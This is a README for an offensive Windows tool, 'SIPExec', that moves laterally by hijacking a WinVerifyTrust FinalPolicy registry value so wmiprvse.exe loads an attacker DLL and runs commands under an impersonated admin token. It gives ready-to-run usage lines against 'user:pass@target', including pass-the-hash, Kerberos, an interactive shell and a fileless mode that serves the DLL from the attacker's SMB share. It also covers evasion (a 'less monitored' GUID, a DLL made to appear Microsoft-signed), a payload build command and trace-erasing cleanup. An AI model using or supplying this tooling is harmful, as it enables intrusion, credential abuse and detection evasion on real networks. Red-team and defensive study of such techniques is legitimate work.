# SIPExec — WinVerifyTrust FinalPolicy Lateral Movement

Lateral movement via WinVerifyTrust FinalPolicy registry hijack. Loads a payload DLL in `wmiprvse.exe` by hijacking the trust provider's `$DLL` value and triggering signature verification through a WMI query.

## How It Works

1. Hijacks `HKLM\...\FinalPolicy\{GUID}` → `$DLL` points to our payload
2. WMI `Win32_PnPSignedDriver` query triggers `WinVerifyTrust` → loads our DLL
3. DLL creates a named pipe, impersonates the connecting client (admin token)
4. Commands execute as the authenticated user, not NETWORK SERVICE
5. Registry restored, wmiprvse killed, DLL deleted on cleanup

## Modes

| Mode | Flag | Delivery | Artifact on disk |
|------|------|----------|-----------------|
| **Serve** | *(default)* | UNC path via local SMB server | None (fileless) |
| **Upload** | `-upload` | DLL uploaded to `C:\Windows\Temp` | Deleted on cleanup |

Both modes run commands as the authenticated user via named pipe impersonation.

## Usage

```bash
# Serve mode (fileless, requires port 445 + reverse connectivity)
python3 sipexec.py 'user:pass@target' whoami

# Upload mode (no reverse connectivity needed)
python3 sipexec.py -upload 'user:pass@target' whoami

# Interactive shell
python3 sipexec.py -upload 'user:pass@target'

# Alternative trust provider GUID (less monitored)
python3 sipexec.py -guid driver 'user:pass@target' whoami

# SIP hijack (DLL appears Microsoft-signed during verification)
python3 sipexec.py -sig-hijack 'user:pass@target' whoami

# Pass-the-hash
python3 sipexec.py -hashes :NTHASH 'user@target' whoami

# Kerberos
python3 sipexec.py -k -dc-ip 10.0.0.1 'user@target' whoami
```

## Build Payload

```bash
x86_64-w64-mingw32-gcc -shared -O2 -s -fno-ident \
  -o sipexec_payload_impersonate.dll \
  sipexec_payload_impersonate.c \
  payload.def \
  -lkernel32 -ladvapi32
```

## Files

```
sipexec.py                       — Tool (impacket-based)
sipexec_payload_impersonate.dll  — Payload DLL (pipe impersonation)
sipexec_payload_impersonate.c    — Payload source
```

## Requirements

- Python 3.8+
- impacket
